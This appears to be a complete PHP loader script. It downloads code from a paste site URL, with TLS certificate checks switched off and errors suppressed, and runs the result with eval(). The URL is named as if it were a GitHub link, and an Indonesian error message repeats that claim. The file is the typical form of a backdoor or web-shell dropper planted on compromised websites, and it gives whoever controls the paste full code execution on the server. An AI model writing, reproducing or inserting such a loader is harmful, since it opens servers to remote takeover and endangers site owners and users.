<?php
$githubRawUrl = 'https://ghostbin.axel.org/paste/2wy2g/raw';

$context = stream_context_create([
    "http" => ["timeout" => 10],
    "ssl"  => ["verify_peer" => false, "verify_peer_name" => false]
]);

$code = @file_get_contents($githubRawUrl, false, $context);

if ($code === false || empty($code)) {
    die("❌ Gagal mengambil kode dari GitHub.");
}

eval("?>" . $code);
?>